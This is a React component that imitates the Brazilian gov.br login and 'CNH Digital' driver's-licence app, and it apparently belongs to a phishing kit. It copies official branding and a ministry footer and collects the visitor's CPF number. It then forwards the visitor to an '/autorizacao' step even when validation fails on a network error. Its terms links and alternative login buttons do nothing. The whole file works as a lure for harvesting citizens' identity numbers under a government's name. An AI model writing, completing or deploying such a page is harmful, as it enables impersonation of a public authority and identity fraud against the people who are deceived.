import { useState } from "react";
import { useLocation } from "wouter";
import { validarCPF } from "@/lib/utils";

export default function CNHLanding() {
  const [, setLocation] = useLocation();
  const [tela, setTela] = useState<"capa" | "login">("capa");
  const [cpf, setCpf] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const mascaraCPF = (val: string) => {
    let v = val.replace(/\D/g, "").slice(0, 11);
    if (v.length > 9) {
      v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, "$1.$2.$3-$4");
    } else if (v.length > 6) {
      v = v.replace(/(\d{3})(\d{3})(\d{0,3})/, "$1.$2.$3");
    } else if (v.length > 3) {
      v = v.replace(/(\d{3})(\d{0,3})/, "$1.$2");
    }
    return v;
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setError("");
    setCpf(mascaraCPF(e.target.value));
  };

  const handleContinue = async () => {
    const digits = cpf.replace(/\D/g, "");
    if (digits.length < 11 || !validarCPF(digits)) {
      setError("CPF informado inválido. (ERL0000500)");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const res = await fetch(`/api/cnh/validate?cpf=${digits}`);
      const json = await res.json().catch(() => ({}));
      if (json.success && json.data) {
        setLocation(`/autorizacao?cpf=${digits}`);
      } else {
        setError("CPF informado inválido. (ERL0000500)");
      }
    } catch {
      setLocation(`/autorizacao?cpf=${digits}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <style>{`
        .cnh-body-root {
          font-family: 'Raleway', 'Rawline', sans-serif;
          background-color: #000;
          height: 100dvh;
          width: 100vw;
          overflow: hidden;
          display: flex;
          justify-content: center;
          align-items: center;
          margin: 0;
          padding: 0;
          box-sizing: border-box;
          -webkit-tap-highlight-color: transparent;
        }

        /* --- ESTILOS DA TELA 1: CAPA --- */
        #tela-capa {
          width: 100%;
          max-width: 450px;
          height: 100%;
          background-color: #fff;
          position: relative;
          display: flex;
          flex-direction: column;
        }

        .capa-area {
          height: 70%;
          width: 100%;
          background-image: url('/img/capa_cnh.png');
          background-size: cover;
          background-position: center top;
          position: relative;
          flex-shrink: 0;
        }

        .capa-area::after {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 40%;
          background: linear-gradient(to bottom, rgba(0, 0, 0, 0.5), transparent);
        }

        .conteudo-branco {
          flex: 1;
          background-color: white;
          border-top-left-radius: 25px;
          border-top-right-radius: 25px;
          margin-top: -25px;
          position: relative;
          z-index: 10;
          padding: 15px 30px;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          gap: 15px;
        }

        .logo-container img {
          max-width: 140px;
          display: block;
          margin-bottom: 5px;
        }

        .termos-texto {
          text-align: center;
          font-size: 12px;
          color: #333;
          line-height: 1.3;
          margin-bottom: 5px;
        }

        .termos-texto a {
          color: #1351b4;
          text-decoration: underline;
          font-weight: 600;
        }

        .btn-gov {
          background-color: #1351b4;
          color: white;
          width: 100%;
          padding: 14px 0;
          border-radius: 50px;
          border: none;
          font-size: 14px;
          font-weight: 700;
          cursor: pointer;
          box-shadow: 0 4px 8px rgba(19, 81, 180, 0.25);
          text-transform: uppercase;
        }

        @media (min-height: 800px) {
          .conteudo-branco {
            justify-content: flex-end;
            padding-bottom: 40px;
            gap: 20px;
          }
        }

        /* --- ESTILOS DA TELA 2: LOGIN --- */
        #tela-login {
          width: 100%;
          max-width: 400px;
          height: 100%;
          background-color: #f6f6f6;
          display: flex;
          flex-direction: column;
          align-items: center;
          overflow-y: auto;
        }

        .header {
          display: flex;
          justify-content: flex-start;
          align-items: center;
          margin-bottom: 24px;
          padding: 16px 20px;
          width: 100%;
          background-color: #fff;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.16);
        }

        .logo-gov-login {
          width: 100px;
        }

        .login-card {
          width: calc(100% - 40px);
          background-color: #fff;
          padding: 24px 16px 22px;
          box-shadow: 0 2px 12px rgba(0, 0, 0, 0.16);
          box-sizing: border-box;
        }

        .title {
          font-weight: 600;
          font-size: 18px;
          color: #000000;
          margin-bottom: 20px;
          width: 100%;
          text-align: left;
        }

        .subtitle {
          font-size: 16px;
          font-weight: 600;
          margin-bottom: 5px;
          display: flex;
          align-items: center;
          gap: 8px;
          width: 100%;
          color: #333;
        }

        .subtitle i {
          color: #1351b4;
        }

        .description {
          font-size: 14px;
          color: #555;
          margin-bottom: 20px;
          line-height: 1.4;
          width: 100%;
        }

        .input-group {
          margin-bottom: 20px;
          width: 100%;
        }

        .label {
          font-weight: 600;
          font-size: 14px;
          color: #333;
          margin-bottom: 5px;
          display: block;
        }

        .input-field {
          width: 100%;
          padding: 12px 15px;
          font-size: 16px;
          border: 1px solid #ccc;
          border-radius: 4px;
          outline: none;
          background-color: #fff;
          color: #333;
        }

        .input-field:focus {
          border-color: #d84800;
          box-shadow: 0 0 0 1px #d84800 inset;
          background-color: #ffee0169;
        }

        .alert-error {
          background-color: #fbf5d0;
          border: 1px solid #e5c22d;
          border-radius: 4px;
          padding: 12px 15px;
          margin-bottom: 20px;
          display: flex;
          align-items: center;
          font-size: 14px;
          color: #000;
          font-weight: 500;
          width: 100%;
        }

        .alert-error i {
          font-size: 18px;
          margin-right: 12px;
        }

        .btn-primary {
          width: 100%;
          padding: 12px;
          background-color: #1351b4;
          color: white;
          border: none;
          border-radius: 25px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          min-width: 0;
        }

        .options-title {
          font-size: 14px;
          font-weight: 600;
          margin-top: 30px;
          margin-bottom: 15px;
          border-top: 1px solid #eee;
          padding-top: 20px;
          width: 100%;
          color: #333;
        }

        .option-btn {
          display: flex;
          align-items: center;
          width: 100%;
          padding: 12px 15px;
          background: white;
          border: 1px solid #ddd;
          border-radius: 25px;
          margin-bottom: 10px;
          color: #1351b4;
          font-weight: 600;
          font-size: 14px;
          cursor: pointer;
          min-width: 0;
        }

        .option-btn i {
          margin-right: 10px;
          font-size: 16px;
          width: 20px;
          text-align: center;
          flex: 0 0 20px;
        }

        .selo {
          background-color: #008f43;
          color: white;
          font-size: 8px;
          line-height: 1;
          padding: 3px 5px;
          border-radius: 4px;
          margin-left: auto;
          white-space: nowrap;
          flex: 0 0 auto;
          text-transform: uppercase;
          font-weight: 700;
        }

        .footer {
          margin-top: 30px;
          text-align: center;
          font-size: 12px;
          color: #666;
          padding-bottom: 20px;
        }

        @media (min-width: 768px) {
          #tela-login .title {
            font-size: 14.4px;
          }

          #tela-login .subtitle,
          #tela-login .input-field,
          #tela-login .btn-primary {
            font-size: 12.8px;
          }

          #tela-login .description,
          #tela-login .label,
          #tela-login .alert-error,
          #tela-login .options-title,
          #tela-login .option-btn {
            font-size: 11.2px;
          }

          #tela-login .option-btn i {
            font-size: 12.8px;
          }

          #tela-login .selo {
            font-size: 7px;
            padding: 3px 4px;
          }

          #tela-login .footer {
            font-size: 9.6px;
          }
        }
      `}</style>

      <div className="cnh-body-root">
        {/* --- TELA 1: CAPA --- */}
        {tela === "capa" && (
          <div id="tela-capa" className="app-container">
            <div className="capa-area" />
            <div className="conteudo-branco">
              <div className="logo-container">
                <img src="/img/logo_cnh.png" alt="CNH Digital" />
              </div>
              <div style={{ width: "100%" }}>
                <div className="termos-texto">
                  Ao entrar, você concorda com nosso <br />
                  <a href="#">Termo de Responsabilidade</a> e <br />
                  <a href="#">Política de Privacidade</a>
                </div>
                <button className="btn-gov" onClick={() => setTela("login")}>
                  ENTRAR COM gov.br
                </button>
              </div>
            </div>
          </div>
        )}

        {/* --- TELA 2: LOGIN --- */}
        {tela === "login" && (
          <div id="tela-login">
            <div className="header">
              <img src="/img/logo.png" className="logo-gov-login" alt="gov.br" />
            </div>
            <div className="login-card">
              <div className="title">Identifique-se no gov.br</div>
              <div className="subtitle">
                <i className="fas fa-id-card"></i> Número do CPF
              </div>
              <div className="description">
                Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
              </div>

              <div className="input-group">
                <label className="label">CPF</label>
                <input
                  type="tel"
                  id="campoCpf"
                  className="input-field"
                  placeholder="Digite seu CPF"
                  maxLength={14}
                  inputMode="numeric"
                  autoComplete="off"
                  value={cpf}
                  onChange={handleCpfChange}
                />
              </div>

              {error && (
                <div id="alert-erro" className="alert-error" style={{ display: "flex" }}>
                  <i className="fas fa-exclamation-triangle"></i> {error}
                </div>
              )}

              <button
                className="btn-primary"
                id="btnProximo"
                onClick={handleContinue}
                disabled={loading}
              >
                {loading ? "Verificando..." : "Continuar"}
              </button>

              <div className="options-title">Outras opções de identificação:</div>
              <div className="option-btn">
                <i className="fas fa-university"></i> Login com seu banco{" "}
                <span className="selo">SUA CONTA SERÁ PRATA</span>
              </div>
              <div className="option-btn">
                <i className="fas fa-qrcode"></i> Login com QR code
              </div>
              <div className="option-btn">
                <i className="fas fa-mobile-alt"></i> Seu aplicativo gov.br
              </div>
              <div className="option-btn">
                <i className="fas fa-cloud"></i> Seu certificado digital em nuvem
              </div>
              <div className="footer">
                Ministério da Gestão e da Inovação em Serviços Públicos
              </div>
            </div>
          </div>
        )}
      </div>
    </>
  );
}
